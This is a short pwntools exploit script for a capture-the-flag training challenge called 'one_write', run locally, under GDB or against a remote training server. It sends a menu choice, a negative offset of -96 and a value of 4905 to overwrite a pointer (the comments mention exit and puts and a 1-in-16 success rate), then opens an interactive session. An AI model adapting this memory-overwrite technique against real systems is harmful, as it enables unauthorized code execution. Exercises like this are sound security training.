from pwn import *

CHALL_PATH = "./one_write"
CHALL = ELF(CHALL_PATH)
COMMANDS = """
b main
b *main+399
c
"""

if args.GDB:
    c = gdb.debug(CHALL_PATH, COMMANDS)
    #input("wait")
elif args.REM:
    c = remote("one-write.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process(CHALL_PATH)



c.recvuntil(b"Choice: ")
choice = b"2"
c.send(choice)

c.recvuntil(b"Offset: ")
#exit -96
#puts -200
offset = b"-96"
c.send(offset)


c.recvuntil(b"Value: ")

#offset 1, works 1 in 16 times
c.send(b"4905")


c.interactive()